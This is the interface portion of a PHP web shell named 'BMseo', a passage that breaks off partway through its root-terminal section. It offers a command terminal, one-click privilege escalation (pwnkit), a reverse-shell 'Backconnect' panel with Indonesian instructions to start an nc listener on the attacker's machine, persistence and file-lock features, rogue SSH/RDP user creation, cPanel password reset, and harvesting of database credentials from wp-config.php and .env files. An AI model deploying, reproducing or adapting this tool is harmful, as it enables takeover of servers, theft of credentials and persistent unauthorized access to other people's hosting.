<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/theme/ayu-mirage.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/show-hint.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
<script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/xml/xml.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/javascript/javascript.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/show-hint.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/xml-hint.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/html-hint.min.js"></script>
<style>
:root{--bg:#0b0e14;--sf:#12161e;--sf2:#1a1f2b;--bd:#252b38;--tx:#c5cdd8;--tx2:#7a8494;--ac:#2d7ff9;--ac2:#1a5bbf;--gn:#22c55e;--rd:#ef4444;--or:#f59e0b;--fn:'Segoe UI',system-ui,sans-serif;--mn:'Consolas','Courier New',monospace}
*{margin:0;padding:0;box-sizing:border-box}
body{background:var(--bg);color:var(--tx);font-family:var(--fn);font-size:15px;line-height:1.6}
a{color:var(--ac);text-decoration:none;transition:color .15s}a:hover{color:#5a9bff}
ul{list-style:none}
::-webkit-scrollbar{width:6px;height:6px}::-webkit-scrollbar-track{background:var(--bg)}
::-webkit-scrollbar-thumb{background:var(--bd);border-radius:3px}::-webkit-file-upload-button{display:none}
.hd{background:var(--sf);border-bottom:1px solid var(--bd);padding:14px 24px;display:flex;align-items:center;justify-content:space-between;gap:16px}
.brand{font-size:18px;font-weight:700;letter-spacing:1.5px;color:#fff;display:flex;align-items:center;gap:10px}
.dot{width:8px;height:8px;border-radius:50%;background:var(--gn);display:inline-block;animation:p 2s infinite}
@keyframes p{0%,100%{opacity:1}50%{opacity:.4}}
.si{display:flex;flex-wrap:wrap;gap:14px;font-size:13px;color:var(--tx2);font-family:var(--mn);margin-top:8px}
.si span{display:flex;align-items:center;gap:5px}
.si i{color:var(--ac);font-size:10px;width:12px;text-align:center}
.lo{color:var(--tx2);font-size:11px;padding:5px 14px;border:1px solid var(--bd);border-radius:5px;transition:all .2s;white-space:nowrap}
.lo:hover{color:var(--rd);border-color:var(--rd)}
.tb-bar{background:var(--sf);border-bottom:1px solid var(--bd);padding:10px 24px;display:flex;flex-wrap:wrap;gap:5px}
.tb{display:inline-flex;align-items:center;gap:5px;padding:6px 14px;border:1px solid var(--bd);border-radius:5px;background:0 0;color:var(--tx2);font-size:12px;font-family:var(--fn);cursor:pointer;transition:all .15s;text-decoration:none;white-space:nowrap}
.tb:hover{background:var(--sf2);color:#fff;border-color:#3a4255}
.tb i{font-size:11px;width:13px;text-align:center}
.tb-a{color:var(--ac);border-color:rgba(45,127,249,.3)}.tb-a:hover{background:rgba(45,127,249,.1);border-color:var(--ac)}
.tb-r{color:var(--rd);border-color:rgba(239,68,68,.3)}.tb-r:hover{background:rgba(239,68,68,.1);border-color:var(--rd)}
.tb-o{color:var(--or);border-color:rgba(245,158,11,.3)}.tb-o:hover{background:rgba(245,158,11,.1);border-color:var(--or)}
.tag{font-size:8px;padding:1px 5px;border-radius:3px;font-weight:700;text-transform:uppercase;margin-left:2px}
.tag-r{background:var(--rd);color:#fff}.tag-o{background:var(--or);color:#000}
.up{background:var(--sf);border-bottom:1px solid var(--bd);padding:8px 24px;display:flex;align-items:center;gap:10px}
.up input[type=file]{color:var(--tx2);font-size:11px;font-family:var(--mn)}
.pw{background:var(--bg);padding:10px 24px;border-bottom:1px solid var(--bd);font-size:12px;font-family:var(--mn)}
.pw a{color:var(--tx2)}.pw a:hover{color:var(--ac)}
.pw .hl{color:var(--gn);font-weight:600}
.fa-bar{padding:8px 24px;display:flex;gap:6px;background:var(--bg);border-bottom:1px solid var(--bd)}
.fa-bar a{padding:4px 12px;border:1px solid var(--bd);border-radius:4px;font-size:11px;color:var(--tx2);transition:all .15s}
.fa-bar a:hover{background:var(--sf2);color:#fff}
.ft{width:100%;border-collapse:collapse}
.ft thead{background:var(--sf)}
.ft th{padding:10px 16px;text-align:left;font-size:11px;color:var(--tx2);font-weight:600;text-transform:uppercase;letter-spacing:.5px;border-bottom:1px solid var(--bd);cursor:pointer;user-select:none;transition:color .15s}
.ft th:hover{color:var(--ac)}
.ft th .si-arr{font-size:9px;margin-left:3px;opacity:.5}
.ft th:nth-child(2),.ft th:nth-child(3),.ft th:nth-child(4),.ft th:nth-child(5){text-align:center}
.ft td{padding:9px 16px;border-bottom:1px solid rgba(37,43,56,.5);font-size:14px}
.ft td:nth-child(2),.ft td:nth-child(3),.ft td:nth-child(4),.ft td:nth-child(5){text-align:center}
.ft .dt{color:var(--tx2);font-size:13px;font-family:var(--mn);cursor:pointer;padding:2px 6px;border-radius:3px;transition:background .15s}
.ft .dt:hover{background:var(--sf2);color:var(--ac)}
.ft .pm{font-family:var(--mn);font-size:13px;cursor:pointer;padding:2px 6px;border-radius:3px;transition:background .15s}
.ft .pm:hover{background:var(--sf2)}
.ft tbody tr{transition:background .1s}.ft tbody tr:hover{background:rgba(45,127,249,.04)}
.ft tbody tr.ctx-active{background:rgba(45,127,249,.1)!important;border-left:3px solid var(--ac)}
.ft tbody tr:nth-child(even){background:rgba(18,22,30,.6)}
.ft .di{color:var(--or)}.ft .fs{color:var(--or);font-family:var(--mn);font-size:11px}
.ft .po{color:var(--gn)}.ft .pn{color:var(--rd)}
.ft .ac{color:var(--tx2);margin:0 4px;font-size:13px;transition:color .15s}.ft .ac:hover{color:var(--ac)}
.ft input[type=checkbox]{accent-color:var(--ac);cursor:pointer}
.sb{padding:12px 24px;display:flex;gap:8px;align-items:center;border-top:1px solid var(--bd)}
.sb select{background:var(--sf2);color:var(--tx);border:1px solid var(--bd);border-radius:5px;padding:6px 12px;font-size:11px;font-family:var(--fn)}
.sb input[type=submit]{background:var(--ac);color:#fff;border:none;border-radius:5px;padding:7px 24px;font-size:11px;cursor:pointer;font-family:var(--fn);transition:background .15s}
.sb input[type=submit]:hover{background:var(--ac2)}
.ov{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.55);z-index:100;display:none;backdrop-filter:blur(2px)}
.ov.active{display:flex;align-items:flex-start;justify-content:center;padding-top:60px}
.ob{background:var(--sf);border:1px solid var(--bd);border-radius:10px;width:620px;max-width:95vw;animation:fs .25s ease}
@keyframes fs{from{opacity:0;transform:translateY(-12px)}to{opacity:1;transform:translateY(0)}}
.oh{padding:14px 20px;border-bottom:1px solid var(--bd);display:flex;align-items:center;justify-content:space-between}
.oh h3{color:#fff;font-size:14px;font-weight:600;display:flex;align-items:center;gap:8px}
.oh h3 i{color:var(--ac);font-size:13px}
.ox{color:var(--tx2);cursor:pointer;font-size:16px;padding:4px;transition:color .15s;text-decoration:none}.ox:hover{color:var(--rd)}
.oby{padding:20px}
.oby input[type=text],.oby input[type=number],.oby input[type=email],.oby input[type=password],.oby select{width:100%;padding:9px 12px;background:var(--bg);border:1px solid var(--bd);border-radius:6px;color:var(--tx);font-size:12px;font-family:var(--fn);margin-bottom:10px;transition:border-color .15s;outline:none}
.oby input:focus,.oby select:focus{border-color:var(--ac)}
.oby textarea{width:100%;padding:10px;background:var(--bg);border:1px solid var(--bd);border-radius:6px;color:var(--tx);resize:vertical;height:100px;font-size:12px;font-family:var(--mn);margin-bottom:10px;outline:none}
.oby textarea:focus{border-color:var(--ac)}
.of{padding:12px 20px;border-top:1px solid var(--bd);display:flex;justify-content:flex-end;gap:8px}
.bp{background:var(--ac);color:#fff;border:none;border-radius:6px;padding:8px 22px;font-size:12px;cursor:pointer;font-family:var(--fn);transition:background .15s}.bp:hover{background:var(--ac2)}
.bs{background:var(--sf2);color:var(--tx);border:1px solid var(--bd);border-radius:6px;padding:7px 18px;font-size:12px;cursor:pointer;font-family:var(--fn);transition:all .15s;text-decoration:none;display:inline-block}.bs:hover{background:var(--bd);color:#fff}
.sep{border:none;border-top:1px solid var(--bd);margin:8px 0 14px}
.tov{padding-top:30px}.tob{width:90%;max-width:960px}
.tob textarea{width:100%;height:340px;background:var(--bg);color:var(--gn);border:1px solid var(--bd);border-radius:6px;padding:12px;font-family:var(--mn);font-size:12px;resize:vertical;margin-bottom:10px;outline:none}
.tob .tr{display:flex;gap:8px;align-items:center}
.tob .tr input[type=text]{flex:1;background:var(--bg);color:var(--gn);border:1px solid var(--bd);border-radius:6px;padding:8px 12px;font-family:var(--mn);font-size:12px;outline:none}
.tob .tr input[type=text]:focus{border-color:var(--gn)}
.eov.active{align-items:center;padding-top:0;overflow:hidden!important}
.eob{width:93%;max-width:1200px;height:92vh;max-height:92vh;display:flex;flex-direction:column;overflow:hidden}
.eob .oh{flex-shrink:0}
.eob form{display:flex;flex-direction:column;flex:1;min-height:0}
.eob .oby{padding:0;flex:1;min-height:0;overflow:hidden}
.eob .of{flex-shrink:0}
.CodeMirror{height:100%!important;font-size:14px;border-radius:0 0 10px 10px}
@media(min-width:768px) and (max-width:1200px) and (min-height:720px){.CodeMirror{font-size:16px!important}}
.wov{padding-top:30px}.wob{width:90%;max-width:920px;max-height:82vh;overflow-y:auto}
.wc{background:var(--bg);border:1px solid var(--bd);border-radius:8px;padding:16px;margin-bottom:10px}
.wc h4{color:var(--ac);font-size:13px;font-weight:600;margin-bottom:10px;display:flex;align-items:center;gap:8px}
.wg{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:6px;font-size:11px;color:var(--tx2);margin-bottom:12px}
.wg div span{color:var(--tx);font-family:var(--mn)}
.wt{width:100%;border-collapse:collapse;font-size:11px;margin-top:8px}
.wt th{background:var(--sf2);padding:7px 10px;text-align:left;color:var(--tx2);font-weight:600;font-size:10px;text-transform:uppercase;letter-spacing:.3px}
.wt td{padding:6px 10px;border-bottom:1px solid var(--bd)}
.wt .ra{color:var(--gn);font-weight:600}.wt .ro{color:var(--tx2)}
.wa{padding:3px 8px;border-radius:4px;font-size:10px;cursor:pointer;border:1px solid var(--bd);background:0 0;color:var(--tx2);margin:0 2px;transition:all .15s;font-family:var(--fn)}
.wa:hover{background:var(--sf2);color:#fff}
.wa-r{border-color:rgba(239,68,68,.3);color:var(--rd)}.wa-r:hover{background:rgba(239,68,68,.1);border-color:var(--rd)}
.wa-g{border-color:rgba(34,197,94,.3);color:var(--gn)}.wa-g:hover{background:rgba(34,197,94,.1);border-color:var(--gn)}
.wcf{margin-top:10px;padding:12px;background:var(--sf2);border-radius:6px;display:none}
.wcf input{padding:7px 10px;background:var(--bg);border:1px solid var(--bd);border-radius:4px;color:var(--tx);font-size:11px;margin-right:6px;width:130px;font-family:var(--fn);outline:none}
.wcf input:focus{border-color:var(--ac)}
.wm{padding:6px 10px;border-radius:4px;font-size:11px;margin-top:8px;display:none}
.wm.ok{background:rgba(34,197,94,.1);color:var(--gn);display:block}
.wm.err{background:rgba(239,68,68,.1);color:var(--rd);display:block}
.ctx{position:fixed;z-index:200;background:var(--sf);border:1px solid var(--bd);border-radius:8px;padding:6px 0;min-width:180px;box-shadow:0 8px 24px rgba(0,0,0,.4);display:none}
.ctx.show{display:block}
.ctx a{display:flex;align-items:center;gap:10px;padding:7px 16px;color:var(--tx);font-size:12px;transition:background .1s}
.ctx a:hover{background:var(--sf2);color:#fff}
.ctx a i{width:14px;text-align:center;color:var(--tx2);font-size:12px}
.ctx hr{border:none;border-top:1px solid var(--bd);margin:4px 0}
.zup{background:var(--sf);border:2px dashed var(--bd);border-radius:8px;padding:20px;text-align:center;margin:10px 24px;color:var(--tx2);font-size:12px;cursor:pointer;transition:border-color .2s}
.zup:hover{border-color:var(--ac);color:var(--ac)}
.zup i{font-size:18px;margin-bottom:6px;display:block}
.dml{background:var(--sf);border:1px solid var(--bd);border-radius:8px;margin:10px 24px;padding:16px;max-height:300px;overflow-y:auto}
.dml table{width:100%;border-collapse:collapse;font-size:12px}
.dml th{text-align:left;padding:6px 10px;color:var(--tx2);font-size:10px;text-transform:uppercase;border-bottom:1px solid var(--bd)}
.dml td{padding:5px 10px;border-bottom:1px solid rgba(37,43,56,.3)}
.dml .cms{padding:2px 6px;border-radius:3px;font-size:10px;font-weight:600}
.dml .cms-wp{background:rgba(34,113,177,.2);color:#4db8ff}
.dml .cms-jm{background:rgba(245,158,11,.2);color:var(--or)}
.dml .cms-ot{background:rgba(148,163,184,.15);color:var(--tx2)}
.tt{position:relative;cursor:help}
.tt:hover::after{content:attr(data-tip);position:absolute;bottom:100%;left:50%;transform:translateX(-50%);background:#1e293b;color:#e2e8f0;padding:6px 10px;border-radius:5px;font-size:11px;white-space:nowrap;z-index:300;margin-bottom:6px;font-weight:400;pointer-events:none;border:1px solid var(--bd)}
</style>
</head>
<body>
<!-- HEADER -->
<div class="hd">
<div>
<div class="brand"><span class="dot"></span>BMseo</div>
<div class="si">
<span><i class="fa-solid fa-microchip"></i><?= $fungsi[8](); ?></span>
<span><i class="fa-solid fa-server"></i><?= $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x53\x4f\x46\x54\x57\x41\x52\x45"]; ?></span>
<span><i class="fa-solid fa-network-wired"></i><?= gethostbyname($_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]); ?> | <?= $_SERVER["\x52\x45\x4d\x4f\x54\x45\x5f\x41\x44\x44\x52"]; ?></span>
<span><i class="fa-solid fa-globe"></i><?= s(); ?></span>
<span><i class="fa-brands fa-php"></i>PHP <?= PHP_VERSION; ?></span>
<span><i class="fa-solid fa-user"></i><?= $fungsi[9](); ?></span>
</div>
</div>
<a href="?logout" class="lo"><i class="fa-solid fa-arrow-right-from-bracket"></i> Logout</a>
</div>
 
<!-- TOOLBAR -->
<div class="tb-bar">
<a href="?d=<?= hx($fungsi[0]()) ?>&terminal=normal" class="tb tt" data-tip="Execute shell commands on this server"><i class="fa-solid fa-terminal"></i>Terminal</a>
<a href="?d=<?= hx($fungsi[0]()) ?>&terminal=root" class="tb tb-r tt" data-tip="Attempt privilege escalation to root (pwnkit)"><i class="fa-solid fa-shield-halved"></i>Auto Root<span class="tag tag-r">ROOT</span></a>
<a href="#" class="tb tt" id="btn-mysql" data-tip="Browse MySQL databases - click tables to view data"><i class="fa-solid fa-database"></i>MySQL</a>
<a href="?d=<?= hx($fungsi[0]()) ?>&destroy" class="tb tb-r tt" data-tip="Block all PHP except this shell via .htaccess"><i class="fa-solid fa-skull"></i>Destroyer</a>
<a href="?d=<?= hx($fungsi[0]()) ?>&lockshell" class="tb tb-o tt" data-tip="Persist this shell - auto-restores if deleted, locks permissions"><i class="fa-solid fa-lock"></i>Lock Shell</a>
<a href="#" class="tb tt" id="lock-file" data-tip="Lock a specific file - prevents deletion via background process"><i class="fa-solid fa-file-shield"></i>Lock File</a>
<a href="#" class="tb tt" id="create-rdp" data-tip="<?= stristr(PHP_OS,'WIN')?'Create RDP user (Windows)':'Create SSH user (Linux - useradd + chpasswd)'; ?>"><i class="fa-solid fa-user-plus"></i><?= stristr(PHP_OS,'WIN')?'RDP':'SSH User'; ?><?php if(stristr(PHP_OS,"WIN")) echo '<span class="tag tag-o">WIN</span>'; else echo '<span class="tag tag-r">SSH</span>'; ?></a>
<a href="?d=<?= hx($fungsi[0]()) ?>&mailer" class="tb tt" data-tip="Send emails using PHP mail() function"><i class="fa-solid fa-envelope"></i>Mailer</a>
<a href="?d=<?= hx($fungsi[0]()) ?>&backconnect" class="tb tt" data-tip="Reverse shell connection back to your listener"><i class="fa-solid fa-plug"></i>Backconnect</a>
<a href="?d=<?= hx($fungsi[0]()) ?>&unlockshell" class="tb tt" data-tip="Kill all PHP background processes (stops lock handlers)"><i class="fa-solid fa-lock-open"></i>Unlock</a>
<a href="//hashes.com/en/tools/hash_identifier" class="tb tt" data-tip="Identify hash types (opens external tool)"><i class="fa-solid fa-fingerprint"></i>Hash ID</a>
<a href="?d=<?= hx($fungsi[0]()) ?>&cpanelreset" class="tb tt" data-tip="Reset cPanel password by changing contact email"><i class="fa-solid fa-rotate-right"></i>cPanel</a>
<a href="#" class="tb tb-a tt" id="btn-wp-panel" data-tip="Scan & manage all WordPress sites - users, passwords, login URLs"><i class="fa-brands fa-wordpress"></i>WP Panel</a>
<a href="#" class="tb tt" id="btn-domains" data-tip="List all active domains on this hosting with CMS detection"><i class="fa-solid fa-sitemap"></i>Domains</a>
</div>
 
<!-- UPLOAD -->
<form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>'>
<div class="up"><input type="submit" value="Upload" name="gecko-up-submit" class="tb tb-a" style="cursor:pointer"><input type="file" name="gecko-upload">
<input type="submit" value="Upload ZIP (Auto-Extract)" name="gecko-zip-submit" class="tb tb-o" style="cursor:pointer"><input type="file" name="gecko-zip-upload" accept=".zip">
</div>
</form>
 
<?php $file_manager = $fungsi[1]("{.[!.],}*", GLOB_BRACE); $get_cwd = $fungsi[0](); ?>
 
<!-- PATHBAR -->
<div class="pw">
<?php
$cwd = str_replace("\\", "/", $get_cwd); $pwd = explode("/", $cwd);
if (stristr(PHP_OS, "WIN")) { windowsDriver(); }
foreach ($pwd as $id => $val) {
    if ($val == '' && $id == 0) { echo '&nbsp;<a href="?d=' . hx('/') . '">/</a>'; continue; }
    if ($val == '') continue;
    echo '<a href="?d=';
    for ($i = 0; $i <= $id; $i++) { echo hx($pwd[$i]); if ($i != $id) echo hx("/"); }
    echo '">' . $val . '/</a>';
}
echo " <a class='hl' href='?d=" . hx(__DIR__) . "'>[HOME]</a>";
?>
</div>
 
<!-- FILE ACTIONS -->
<div class="fa-bar">
<a href="#" id="create_folder"><i class="fa-solid fa-folder-plus"></i> New Folder</a>
<a href="#" id="create_file"><i class="fa-solid fa-file-circle-plus"></i> New File</a>
</div>
 
<!-- FILE TABLE -->
<form action="" method="post">
<table class="ft" id="ftable">
<thead><tr>
<th data-sort="name" style="width:40%">Name <span class="si-arr"><i class="fa-solid fa-sort"></i></span></th>
<th data-sort="size">Size <span class="si-arr"><i class="fa-solid fa-sort"></i></span></th>
<th data-sort="date">Date <span class="si-arr"><i class="fa-solid fa-sort"></i></span></th>
<th data-sort="perm">Permission <span class="si-arr"><i class="fa-solid fa-sort"></i></span></th>
<th data-sort="owner">Owner</th>
<th>Action</th>
</tr></thead>
<tbody>
<?php foreach ($file_manager as $_D) : ?>
<?php if ($fungsi[2]($_D)) : $fp=$fungsi[0]().'/'.$_D; ?>
<tr data-name="<?= strtolower($_D) ?>" data-size="0" data-date="<?= @filemtime($fp) ?>" data-perm="<?= @substr(sprintf('%o',$fungsi[6]($fp)),-4) ?>" data-type="dir" data-file="<?= hx($_D) ?>" oncontextmenu="showCtx(event,'<?= hx($_D) ?>','dir');return false">
<td><input type="checkbox" name="check[]" value="<?= $_D ?>"> <i class="fa-solid fa-folder di"></i> <a href="?d=<?= hx($fungsi[0]() . "/" . $_D); ?>"><?= namaPanjang($_D); ?></a></td>
<td style="color:var(--tx2);font-size:12px">DIR</td>
<td class="dt" onclick="inlineDate('<?= hx($_D) ?>',this)"><?= @date('d M Y H:i', filemtime($fp)) ?></td>
<td><span class="pm <?php echo $fungsi[4]($fp)?'po':''; echo !$fungsi[5]($fp)?'pn':''; ?>" onclick="inlineChmod('<?= hx($_D) ?>',this)"><?= @substr(sprintf('%o',$fungsi[6]($fp)),-4) ?></span></td>
<td style="color:var(--tx2);font-size:11px"><?= function_exists('posix_getpwuid')?@posix_getpwuid(@fileowner($fp))['name']:'?'; ?></td>
<td><a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_D) ?>" class="ac" title="Rename"><i class="fa-solid fa-pen"></i></a><a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_D) ?>" class="ac" title="Chmod"><i class="fa-solid fa-key"></i></a></td>
</tr>
<?php endif; ?>
<?php endforeach; ?>
<?php foreach ($file_manager as $_F) : ?>
<?php if ($fungsi[3]($_F)) : $fp=$fungsi[0]().'/'.$_F; ?>
<tr data-name="<?= strtolower($_F) ?>" data-size="<?= @filesize($_F) ?>" data-date="<?= @filemtime($fp) ?>" data-perm="<?= @substr(sprintf('%o',$fungsi[6]($fp)),-4) ?>" data-type="file" data-file="<?= hx($_F) ?>" oncontextmenu="showCtx(event,'<?= hx($_F) ?>','file');return false">
<td><input type="checkbox" name="check[]" value="<?= $_F ?>"> <?= file_ext($_F) ?> <a href="?d=<?= hx($fungsi[0]()); ?>&f=<?= hx($_F); ?>"><?= namaPanjang($_F); ?></a></td>
<td class="fs"><?= formatSize(filesize($_F)); ?></td>
<td class="dt" onclick="inlineDate('<?= hx($_F) ?>',this)"><?= @date('d M Y H:i', filemtime($fp)) ?></td>
<td><span class="pm <?php echo is_writable($fp)?'po':''; echo !is_readable($fp)?'pn':''; ?>" onclick="inlineChmod('<?= hx($_F) ?>',this)"><?= @substr(sprintf('%o',$fungsi[6]($fp)),-4) ?></span></td>
<td style="color:var(--tx2);font-size:11px"><?= function_exists('posix_getpwuid')?@posix_getpwuid(@fileowner($fp))['name']:'?'; ?></td>
<td><a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_F) ?>" class="ac" title="Rename"><i class="fa-solid fa-pen"></i></a><a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_F) ?>" class="ac" title="Chmod"><i class="fa-solid fa-key"></i></a><a href="?d=<?= hx($fungsi[0]()); ?>&don=<?= hx($_F) ?>" class="ac" title="Download"><i class="fa-solid fa-download"></i></a></td>
</tr>
<?php endif; ?>
<?php endforeach; ?>
</tbody>
</table>
<div class="sb">
<select name="gecko-select"><option value="delete">Delete</option><option value="unzip">Unzip</option><option value="zip">Zip</option></select>
<input type="submit" name="submit-action" value="Execute">
</div>
</form>
 
<!-- MODAL: Generic -->
<div class="ov" id="modal-generic">
<div class="ob">
<div class="oh"><h3 id="modal-title"></h3><span class="ox" id="close-modal"><i class="fa-solid fa-xmark"></i></span></div>
<form action="" method="post">
<div class="oby"><div id="modal-body-bc"></div><span id="modal-input"></span></div>
<div class="of"><input type="submit" name="submit" value="Submit" class="bp"><button class="bs" onclick="$('#modal-generic').removeClass('active');event.preventDefault()">Cancel</button></div>
</form>
</div>
</div>
 
<?php if (isset($_GET['cpanelreset'])) : ?>
<div class="ov active"><div class="ob">
<div class="oh"><h3><i class="fa-solid fa-rotate-right"></i> cPanel Reset</h3><a class="ox" href="?d=<?= hx($fungsi[0]()) ?>"><i class="fa-solid fa-xmark"></i></a></div>
<form action="" method="post"><div class="oby"><input type="email" name="resetcp" placeholder="Email address"></div>
<div class="of"><input type="submit" name="submit" value="Reset" class="bp"><a class="bs" href="?d=<?= hx($fungsi[0]()) ?>">Cancel</a></div></form>
</div></div>
<?php endif; ?>
 
<!-- MySQL Browser Modal -->
<div class="ov" id="mysql-panel"><div class="ob" style="width:900px;max-width:95vw;max-height:85vh;overflow-y:auto">
<div class="oh"><h3><i class="fa-solid fa-database"></i> MySQL Browser</h3><span class="ox" onclick="$('#mysql-panel').removeClass('active')"><i class="fa-solid fa-xmark"></i></span></div>
<div class="oby">
<p style="font-size:11px;color:var(--tx2);margin-bottom:12px">Auto-detects credentials from wp-config.php or .env files. Or enter manually below.</p>
<div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:12px">
<input type="text" id="db-host" placeholder="Host (localhost)" style="width:120px">
<input type="text" id="db-user" placeholder="DB User" style="width:120px">
<input type="password" id="db-pass" placeholder="DB Password" style="width:120px">
<input type="text" id="db-name" placeholder="DB Name" style="width:120px">
<button class="bp" onclick="mysqlConnect()" style="padding:6px 16px">Connect</button>
<button class="bs" onclick="mysqlAutoDetect()" style="padding:6px 16px">Auto-Detect</button>
</div>
<div id="mysql-content" style="font-size:12px"></div>
</div>
</div></div>

<!-- Active Domains Modal -->
<div class="ov" id="domains-panel"><div class="ob" style="width:800px;max-width:95vw;max-height:85vh;overflow-y:auto">
<div class="oh"><h3><i class="fa-solid fa-sitemap"></i> Active Domains</h3><span class="ox" onclick="$('#domains-panel').removeClass('active')"><i class="fa-solid fa-xmark"></i></span></div>
<div class="oby" id="domains-content">
<p style="font-size:11px;color:var(--tx2);margin-bottom:10px">Scans hosting for active domains, checks HTTP response and detects CMS.</p>
<div style="text-align:center;padding:20px;color:var(--tx2)"><button class="bp" onclick="scanDomains()">Start Scan</button></div>
</div>
</div></div>
 
<?php if (isset($_GET['backconnect'])) : ?>
<div class="ov active"><div class="ob">
<div class="oh"><h3><i class="fa-solid fa-plug"></i> Backconnect (Reverse Shell)</h3><a class="ox" href="?d=<?= hx($fungsi[0]()) ?>"><i class="fa-solid fa-xmark"></i></a></div>
<form action="" method="post"><div class="oby">
<div style="background:var(--bg);border:1px solid var(--bd);border-radius:6px;padding:12px;margin-bottom:12px;font-size:12px;color:var(--tx2)">
<strong style="color:var(--gn)">Cara Pakai:</strong><br>
1. Di mesin kamu (attacker), jalankan listener:<br>
<code style="color:var(--or);background:var(--sf2);padding:2px 6px;border-radius:3px">nc -lvnp 1337</code><br>
2. Isi <strong>Host</strong> = IP publik mesin kamu (attacker)<br>
3. Isi <strong>Port</strong> = port listener (sama dengan di atas)<br>
4. Pilih method yang tersedia di server target, lalu klik Connect
</div>
<select name="gecko-bc"><option value="-">-- Select Method --</option><option value="bash">Bash (paling umum)</option><option value="python">Python</option><option value="perl">Perl</option><option value="php">PHP</option><option value="nc">Netcat</option><option value="ruby">Ruby</option><option value="sh">SH</option><option value="xterm">Xterm</option><option value="golang">Golang</option></select>
<input type="text" name="backconnect-host" placeholder="Host / IP attacker (contoh: 103.x.x.x)">
<input type="number" name="backconnect-port" placeholder="Port (contoh: 1337)">
</div>
<div class="of"><input type="submit" name="submit-bc" value="Connect" class="bp"><a class="bs" href="?d=<?= hx($fungsi[0]()) ?>">Cancel</a></div></form>
</div></div>
<?php endif; ?>
 
<?php if (isset($_GET['mailer'])) : ?>
<div class="ov active"><div class="ob">
<div class="oh"><h3><i class="fa-solid fa-envelope"></i> PHP Mailer</h3><a class="ox" href="?d=<?= hx($fungsi[0]()) ?>"><i class="fa-solid fa-xmark"></i></a></div>
<form action="" method="post"><div class="oby">
<textarea name="message-smtp" placeholder="Message body"></textarea>
<input type="text" name="mailto-subject" placeholder="Subject">
<input type="email" name="mail-from-smtp" placeholder="From: sender@mail.com">
<input type="email" name="mail-to-smtp" placeholder="To: recipient@mail.com">
</div>
<div class="of"><input type="submit" name="submit" value="Send" class="bp"><a class="bs" href="?d=<?= hx($fungsi[0]()) ?>">Cancel</a></div></form>
</div></div>
<?php endif; ?>
 
<?php if ($_GET['re'] == true) : ?>
<div class="ov active"><div class="ob">
<div class="oh"><h3><i class="fa-solid fa-pen"></i> Rename: <?= unx($_GET['re']) ?></h3><span class="ox close-btn-s"><i class="fa-solid fa-xmark"></i></span></div>
<form action="" method="post"><div class="oby"><input type="text" name="renameFile" placeholder="New name"></div>
<div class="of"><input type="submit" name="submit" value="Rename" class="bp"><button class="bs close-btn-s" onclick="event.preventDefault()">Cancel</button></div></form>
</div></div>
<?php endif; ?>
 
<?php if ($_GET['ch'] == true) : ?>
<div class="ov active"><div class="ob">
<div class="oh"><h3><i class="fa-solid fa-key"></i> Chmod: <?= unx($_GET['ch']) ?></h3><span class="ox close-btn-s"><i class="fa-solid fa-xmark"></i></span></div>
<form action="" method="post"><div class="oby"><input type="number" name="chFile" placeholder="0775"></div>
<div class="of"><input type="submit" name="submit" value="Apply" class="bp"><button class="bs close-btn-s" onclick="event.preventDefault()">Cancel</button></div></form>
</div></div>
<?php endif; ?>
 
<?php if (!empty($_GET['f'])): ?>
<div class="ov active eov"><div class="ob eob">
<div class="oh"><h3><i class="fa-solid fa-code"></i> <?= unx($_GET['f']); ?></h3><span class="ox" id="close-editor"><i class="fa-solid fa-xmark"></i></span></div>
<form action="" method="post"><div class="oby">
<textarea name="code-editor" id="code"><?= $fungsi[10]($fungsi[11]($fungsi[0]() . "/" . unx($_GET['f']))); ?></textarea>
</div>
<div class="of"><input type="submit" name="save-editor" value="Save" class="bp"><button class="bs" id="close-editor-btn" onclick="event.preventDefault()">Close</button></div></form>
</div></div>
<?php endif; ?>
 
<?php if ($_GET['terminal'] == "normal") : ?>
<div class="ov active tov"><div class="ob tob">
<div class="oh"><h3><i class="fa-solid fa-terminal"></i> Terminal</h3><a class="ox" href="?d=<?= hx($fungsi[0]()) ?>"><i class="fa-solid fa-xmark"></i></a></div>
<div class="oby">
<textarea disabled><?php if (isset($_POST['terminal'])) { echo $fungsi[10](cmd($_POST['terminal-text'] . " 2>&1")); } ?></textarea>
<form action="" method="post"><div class="tr">
<input type="text" name="terminal-text" placeholder="<?= $fungsi[9]().'@'.$_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?>" autofocus>
<input type="submit" name="terminal" value="Run" class="bp" style="padding:8px 18px">
</div></form>
</div></div></div>
<?php endif; ?>
 
<?php if ($_GET['terminal'] == "root") : ?>
<div class="ov active tov"><div class="ob tob">
